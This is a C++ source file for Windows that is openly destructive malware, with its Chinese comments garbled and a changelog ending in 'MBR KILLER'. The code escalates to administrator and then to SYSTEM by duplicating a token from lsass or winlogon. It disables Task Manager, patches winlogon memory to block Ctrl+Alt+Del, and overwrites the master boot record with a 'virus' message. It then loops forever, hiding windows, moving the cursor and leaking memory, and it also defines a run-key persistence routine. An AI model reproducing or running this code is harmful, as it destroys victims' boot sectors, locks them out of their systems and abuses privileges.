#include <bits/stdc++.h>
#include <windows.h>
#include <TlHelp32.h>
#include <winnt.h>
using namespace std;
namespace Windows_Admin { //windowsȨ�޹���
	#include <bits/stdc++.h>
	#include <windows.h>
	#include <TlHelp32.h>
	#include <winnt.h>
	using namespace std;
	#define KEY_DOWN(VK_NONAME) ((GetAsyncKeyState(VK_NONAME) & 0x8000) ? 1:0)
	LPWSTR ToLPWSTR(char** charArray) {
		int charCount = 0;
		// �����ܵĶ��ֽ��ַ���
		while (charArray[charCount] != NULL) {
			charCount++;
		}

		int bufferSize = MultiByteToWideChar(CP_ACP, 0, charArray[0], -1, NULL, 0);
		LPWSTR lpwsz = new WCHAR[bufferSize];
		MultiByteToWideChar(CP_ACP, 0, charArray[0], -1, lpwsz, bufferSize);

		// ���������ַ����ظ�ת������
		for (int i = 1; i < charCount; ++i) {
			bufferSize = MultiByteToWideChar(CP_ACP, 0, charArray[i], -1, NULL, 0);
			LPWSTR temp = new WCHAR[bufferSize];
			MultiByteToWideChar(CP_ACP, 0, charArray[i], -1, temp, bufferSize);

			// ��ת����Ŀ��ַ��ַ���׷�ӵ�lpwsz
			wcscat(lpwsz, temp);

			// �ͷ���ʱ���ַ���
			delete[] temp;
		}

		return lpwsz;
	}

	void HKRunator(char *programName) { //�������ƣ�**ȫ·��**��
		HKEY hkey = NULL;
		DWORD rc;

		rc = RegCreateKeyEx(HKEY_LOCAL_MACHINE,                      //����һ��ע�����������򿪸�ע�����
		                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		                    0,
		                    NULL,
		                    REG_OPTION_NON_VOLATILE,
		                    KEY_WOW64_64KEY | KEY_ALL_ACCESS,    //����windowsϵͳ������лᱨ�� ɾ�� ����KEY_WOW64_64KEY | ���� ����
		                    NULL,
		                    &hkey,
		                    NULL);

		if (rc == ERROR_SUCCESS) {
			rc = RegSetValueEx(hkey,
			                   "UStealer",
			                   0,
			                   REG_SZ,
			                   (const BYTE *)programName,
			                   strlen(programName));
			if (rc == ERROR_SUCCESS) {
				RegCloseKey(hkey);
			}
		}
	}
	bool IsAdmin() { //�Ƿ�Ϊ����Ա
// return 1;
		BOOL b;
		SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
		PSID AdministratorsGroup;
		b = AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &AdministratorsGroup);
		if (b) {
			if (!CheckTokenMembership(NULL, AdministratorsGroup, &b)) {
				b = FALSE;
			}
			FreeSid(AdministratorsGroup);
		}

		return(b);
	}

	void Get_Admin(char** argv) { //����Ȩ��������Ա
		if (!IsAdmin()) {
			ShellExecute(NULL, "runas", argv[0], NULL, NULL, SW_SHOWNORMAL);
			cout<<"get!"<<endl;
			exit(0);
		}
	}

	bool Get_Permanent_Admin(int args,char** argv) { //���ù���Ա
//  if (argc < 1) {
//         std::cerr << "No file path provided." << std::endl;
//         return 1;
//     }

		// ��ȡ�ļ�·��
		std::string filePath = argv[0];

		// ע���·��
		std::wstring regPath = L"Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers";

		// ��ע�����
		HKEY hKey;
		LONG result = RegOpenKeyExW(HKEY_CURRENT_USER, regPath.c_str(), 0, KEY_SET_VALUE, &hKey);
		if (result != ERROR_SUCCESS) {
			std::cerr << "Error opening registry key: " << result << std::endl;
			return 1;
		}

		// ����ע���ֵ
		std::wstring wFilePath(filePath.begin(), filePath.end());
		result = RegSetValueExW(hKey, wFilePath.c_str(), 0, REG_SZ, reinterpret_cast<const BYTE*>(L"RUNASADMIN"), (wFilePath.length() + 1) * sizeof(wchar_t));
		if (result != ERROR_SUCCESS) {
			std::cerr << "Error setting registry value: " << result << std::endl;
			RegCloseKey(hKey);
			return 1;
		}

		std::cout << "Registry value set successfully." << std::endl;

		// �ر�ע�����
		RegCloseKey(hKey);
	}

	std::wstring GetCommandLineWithArgs(const std::wstring &program, const std::vector<std::wstring> &args) {
		std::wstring cmdLine = program;
		for (const auto &arg : args) {
			cmdLine += L" ";
			cmdLine += L"\"";
			cmdLine += arg;
			cmdLine += L"\"";
		}
		return cmdLine;
	}

	void Get_System(char** argv) { //System
		HANDLE hToken;
		LUID Luid;
		TOKEN_PRIVILEGES tp;
		OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &Luid);
		tp.PrivilegeCount = 1;
		tp.Privileges[0].Luid = Luid;
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		AdjustTokenPrivileges(hToken, false, &tp, sizeof(tp), NULL, NULL);
		CloseHandle(hToken);

		//ö�ٽ��̻�ȡlsass.exe��ID��winlogon.exe��ID�����������еĿ���ֱ�Ӵ򿪾����ϵͳ����
		DWORD idL, idW;
		PROCESSENTRY32 pe;
		pe.dwSize = sizeof(PROCESSENTRY32);
		HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (Process32First(hSnapshot, &pe)) {
			do {
				if (0 == _stricmp(pe.szExeFile, "lsass.exe")) {
					idL = pe.th32ProcessID;
				} else if (0 == _stricmp(pe.szExeFile, "winlogon.exe")) {
					idW = pe.th32ProcessID;
				}
			} while (Process32Next(hSnapshot, &pe));
		}
		CloseHandle(hSnapshot);

		//��ȡ���������lsass����winlogon
		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, idL);
		if(!hProcess)hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, idW);
		HANDLE hTokenx;
		//��ȡ����
		OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hTokenx);
		//��������
		DuplicateTokenEx(hTokenx, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &hToken);
		CloseHandle(hProcess);
		CloseHandle(hTokenx);
		//������Ϣ
		STARTUPINFOW si;
		PROCESS_INFORMATION pi;
		ZeroMemory(&si, sizeof(STARTUPINFOW));
		si.cb = sizeof(STARTUPINFOW);
		si.lpDesktop = L"winsta0\\default";
		//char** tmp={argv,"issystem"}

		std::wstring program = ToLPWSTR(argv);
		std::vector<std::wstring> arguments = { L"isSystem"};
		std::wstring commandLine = GetCommandLineWithArgs(program, arguments);

		CreateProcessWithTokenW(hToken, LOGON_NETCREDENTIALS_ONLY, NULL, const_cast<LPWSTR>(commandLine.c_str()), NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);
		CloseHandle(hToken);
		exit(0);
	}

	void RaiseToDebug() {
		HANDLE hToken;
		TOKEN_PRIVILEGES tkp;
		if(OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
			LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid);
			tkp.PrivilegeCount = 1;
			tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL);
			CloseHandle(hToken);
		}
	}

//����windows�ȼ�
	bool Start() {
		auto module  = GetModuleHandleA("rpcrt4.dll");
		auto func = GetProcAddress(module, "RpcServerTestCancel");
		if(func) {
			auto snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
			PROCESSENTRY32 pe32;
			pe32.dwSize = sizeof(PROCESSENTRY32);
			if(Process32First(snapshot, &pe32)) {
				do {
					if(!strcmp(pe32.szExeFile, "winlogon.exe")) {
						auto hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
						if(hProcess) {
							DWORD oldpp;
							if(VirtualProtectEx(hProcess,(void *)func, 0x100,PAGE_EXECUTE_READWRITE,&oldpp)) {
								unsigned char buf[] = {0x33,0xc0,0xc3};
								WriteProcessMemory(hProcess, (void *)func,buf, sizeof(buf), NULL);
							}
							CloseHandle(hProcess);
						}
					}
				} while(Process32Next(snapshot, &pe32));
			}


		}
		return true;
	}

//���¿���windows�ȼ�
	bool Stop() {
		auto module  = GetModuleHandleA("rpcrt4.dll");
		auto func = GetProcAddress(module, "RpcServerTestCancel");
		if(func) {
			auto snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
			PROCESSENTRY32 pe32;
			pe32.dwSize = sizeof(PROCESSENTRY32);
			if(Process32First(snapshot, &pe32)) {
				do {
					if(!strcmp(pe32.szExeFile, "winlogon.exe")) {
						auto hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
						if(hProcess) {
							DWORD oldpp;
							if(VirtualProtectEx(hProcess,(void *)func, 0x100,PAGE_EXECUTE_READWRITE,&oldpp)) {
								WriteProcessMemory(hProcess, (void *)func,(void *)func, 3, NULL);
							}
							CloseHandle(hProcess);
						}
					}
				} while(Process32Next(snapshot, &pe32));
			}
		}
		return true;
	}

//�޷������ر�
	void can_not_close() {
		HWND hwnd=GetConsoleWindow();
		HMENU hmenu=GetSystemMenu(hwnd,false);
		RemoveMenu(hmenu,SC_CLOSE,MF_BYCOMMAND);
		LONG style=GetWindowLong(hwnd, GWL_STYLE);
		style&=~(WS_MINIMIZEBOX);
		SetWindowLong(hwnd,GWL_STYLE,style);
		SetWindowPos(hwnd,HWND_TOP,0,0,0,0,SWP_NOMOVE|SWP_NOSIZE);
		ShowWindow(hwnd,SW_SHOWNORMAL);
		DestroyMenu(hmenu);
		ReleaseDC(hwnd,NULL);
	}

//����ע���༭��
	void Ban_RegistryEditor() {
		HKEY hkey;
		DWORD value = 0;
		RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
		RegSetValueEx(hkey, "DisableRegistryTools", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
		RegCloseKey(hkey);
	}

//�������������
	void Ban_TaskManager() {
		HKEY hkey;
		DWORD value = 1;
		RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
		RegSetValueEx(hkey, "DisableTaskMgr", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
		RegCloseKey(hkey);
	}

//ģ����̰��£�nΪ��ֵ
	void Key_Down(int n) {
		keybd_event(n,0,0,0);
	}

//���̵���
	void Key_Up(int n) {
		keybd_event(n,0,2,0);
	}

}

void Draw(std::string tp) {
	if (tp == "EXE")
		DrawIcon(GetWindowDC(GetDesktopWindow()), rand() % 1920 + 1, rand() % 1080 + 1, LoadIcon(NULL, IDI_APPLICATION));
	else if (tp == "?")
		DrawIcon(GetWindowDC(GetDesktopWindow()), rand() % 1920 + 1, rand() % 1080 + 1, LoadIcon(NULL, IDI_QUESTION));
	else if (tp == "i")
		DrawIcon(GetWindowDC(GetDesktopWindow()), rand() % 1920 + 1, rand() % 1080 + 1, LoadIcon(NULL, IDI_ASTERISK));
	else if (tp == "ERROR")
		DrawIcon(GetWindowDC(GetDesktopWindow()), rand() % 1920 + 1, rand() % 1080 + 1, LoadIcon(NULL, IDI_HAND));
	else if (tp == "!")
		DrawIcon(GetWindowDC(GetDesktopWindow()), rand() % 1920 + 1, rand() % 1080 + 1, LoadIcon(NULL, IDI_WARNING));
}

using namespace Windows_Admin;


void _run() {
	if (MessageBox(NULL,"run?","run?",MB_YESNO)==IDNO) {
		cout << "Exited" << endl;
		exit(0);
	}
}

/*
int main(){
    LoadLibraryA("rpcrt4.dll");
    RaiseToDebug();
 //����ctrl+alt+del
    Start();
    getchar();
    string t;
    cin >> t;
 //����ctrl+alt+del
    Stop();
    return 0;
}
*/


/*
void DXC_A()
{
 while(1)
    {
        HWND hWnd=GetForegroundWindow();
        ShowWindow(hWnd,SW_HIDE);
    }
}

void DXC_B()
{
 while(1)
    {
        system("start cmd");
    }
}

void DXC_C()
{
 while(1)
    {
        SetCursorPos(rand()%1000,rand()%1000);
    }
}
*/

unsigned char scode[] =
    "\xb8\x12\x00\xcd\x10\xbd\x18\x7c\xb9\x18\x00\xb8\x01\x13\xbb\x0c"
    "\x00\xba\x1d\x0e\xcd\x10\xe2\xfe\x49\x20\x61\x6d\x20\x76\x69\x72"
    "\x75\x73\x21\x20\x46\x75\x63\x6b\x20\x79\x6f\x75\x20\x3a\x2d\x29";

void Main() {
	cout << "�������г���..." << endl;

	/*-----------------------ǰ��---------------------------------*/


//�ö�
	HWND hWnd = ::GetForegroundWindow();
	::SetWindowPos(hWnd, HWND_TOPMOST, 0, 0, 100, 100, SWP_NOMOVE | SWP_NOSIZE);

//�޷��ر�
	can_not_close();

//���ע���
	Ban_RegistryEditor();
	//������������
	Ban_TaskManager();

	//����ϵͳ�ȼ�
	LoadLibraryA("rpcrt4.dll");
	
	RaiseToDebug();
	Start();
	
	HANDLE hDevice;
	DWORD dwBytesWritten, dwBytesReturned;
	BYTE pMBR[512] = {0};

// ���¹���MBR
	memcpy(pMBR, scode, sizeof(scode) - 1);
	pMBR[510] = 0x55;
	pMBR[511] = 0xAA;

	hDevice = CreateFile
	          (
	              "\\\\.\\PHYSICALDRIVE0",
	              GENERIC_READ | GENERIC_WRITE,
	              FILE_SHARE_READ | FILE_SHARE_WRITE,
	              NULL,
	              OPEN_EXISTING,
	              0,
	              NULL
	          );
	if (hDevice == INVALID_HANDLE_VALUE)
		return ;
	DeviceIoControl
	(
	    hDevice,
	    FSCTL_LOCK_VOLUME,
	    NULL,
	    0,
	    NULL,
	    0,
	    &dwBytesReturned,
	    NULL
	);
// д�벡������
	WriteFile(hDevice, pMBR, sizeof(pMBR), &dwBytesWritten, NULL);
	DeviceIoControl
	(
	    hDevice,
	    FSCTL_UNLOCK_VOLUME,
	    NULL,
	    0,
	    NULL,
	    0,
	    &dwBytesReturned,
	    NULL
	);
	CloseHandle(hDevice);
//    std::string str_exe_name = "taskmgr.exe";
// DWORD nPid;
// FindProcess(str_exe_name, nPid);
// EnableDebugPriv();
// KillProcess(nPid);

	/*------------------------------------------------------------*/

//
	Key_Down(91);
	Key_Down(187);
	Key_Up(91);
	Key_Up(187);
	while (1) {
		HWND hWnd=GetForegroundWindow();
		ShowWindow(hWnd,SW_HIDE);
		SetCursorPos(rand()%1000,rand()%1000);
		malloc(512);
//        system("start cmd");
		malloc(512);
		Draw("ERROR");
		Key_Down(91);
		malloc(512);
		Key_Down(187);
		malloc(512);
		Key_Up(187);
		malloc(512);
		Key_Down(189);
		malloc(512);
		Key_Up(189);
		Key_Up(91);
		malloc(512);
	}
// thread newThread1(DXC_A);
// thread newThread2(DXC_B);
//  thread newThread3(DXC_C);
}
signed main(int argc, char** argv) {
	ios_base::sync_with_stdio(false);
	cin.tie(0);
	cout.tie(0);


// cerr << 1 << endl;

//����Ȩ�� ��Ȩ��->����Ա->System ����1
	if (!IsAdmin()) Get_Admin(argv); //����Ա
	else if (argc<=1) {
		Get_System(argv);
	}
//����Ȩ�� ����2
//pass

	if (argc>1) cerr << "With System!" << endl;
	_run(); //��ʾ��

//HKRunator(argv[0]); //������
	Main(); //����������
	return 0;
}






/*
uType Option Meaning
MB_OK ����������һ����ť��ȷ��
MB_YESNO ��������������ť���ǡ���
MB_ABORTRETRYIGNORE ��������������ť�����������Ժ�����
MB_YESNOCANCEL ��������������ť�� �ǡ���ȡ��
MB_OKCANCEL ��������������ť��ȷ�ϡ�ȡ��


#include <windows.h>

int main(int argc, char *argv[])
{

 HWND hWnd = ::GetForegroundWindow();

 ::SetWindowPos(hWnd, HWND_TOPMOST, 0, 0, 100, 100, SWP_NOMOVE | SWP_NOSIZE);

 return FALSE;
}

�����ö�

���������
#include <Windows.h>
#include <iostream>
#include <string>

// ���������
void AddStartupEntry(const std::wstring& appName, const std::wstring& appPath) {
    HKEY hKey;
    LONG result = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    if (result == ERROR_SUCCESS) {
        result = RegSetValueExW(hKey, appName.c_str(), 0, REG_SZ, (BYTE*)appPath.c_str(), (appPath.size() + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
        if (result == ERROR_SUCCESS) {
            std::wcout << L"������ \"" << appName << L"\" �ѳɹ����" << std::endl;
        } else {
            std::wcerr << L"���������ʧ��: " << result << std::endl;
        }
    } else {
        std::wcerr << L"�޷���ע�����: " << result << std::endl;
    }
}

// ɾ��������
void RemoveStartupEntry(const std::wstring& appName) {
    HKEY hKey;
    LONG result = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    if (result == ERROR_SUCCESS) {
        result = RegDeleteValueW(hKey, appName.c_str());
        RegCloseKey(hKey);
        if (result == ERROR_SUCCESS) {
            std::wcout << L"������ \"" << appName << L"\" �ѳɹ��Ƴ�" << std::endl;
        } else {
            std::wcerr << L"�Ƴ�������ʧ��: " << result << std::endl;
        }
    } else {
        std::wcerr << L"�޷���ע�����: " << result << std::endl;
    }
}

int main() {
    // ���������
    AddStartupEntry(L"MyApp", L"C:\\Path\\To\\Your\\Application.exe");

    // ɾ��������
    // RemoveStartupEntry(L"MyApp");

    return 0;
}



������־��
0.8.3 2024/4/17 ǰ��-���ע������������
0.9.2 2024/4/17 ǰ��-�����ö����޷��ر�
1.1.0 2024/4/17 ����Ҷ�
1.2.0 2024/4/17 ���������ʧ
1.3.0 2024/4/18 ը�ڴ�(start cmd)
1.4.0 2024/4/19 ����ctrl+alt+del
1.4.5 2024/4/19 ��������windows�ȼ�
1.5.0 2024/4/19 �ظ��Ŵ���С
1.6.0 2024/4/20 �Զ�����Ա����
1.6.3 2024/4/20 �Ż�����Ա����
1.6.5 2024/4/20 �ر�ը�ڴ�(start cmd)
1.7.0 2024/4/20 ������
kz1.0 2024/4/20 ����1.0
2.0.0 2024/4/20 ��ȨSystem
2.0.5 2024/4/20 �Ż����
2.0.8 2024/4/21 �޸����⣨_run()����֮��Ż������������_run()֮ǰ��ֻ����Ȩ����Ա����ȨSystem���У�
2.1.0 2024/4/21 �������⣨����windowsϵͳ�汾��ͬ���˲���ֻ���win10��Ч�����ڸĽ���
2.1.1 2024/4/21 ը�ڴ�2.0 malloc()
2.1.2 2024/4/21 ըͼ��
3.0.0 2024/4/23 MBR KILLER 
*/
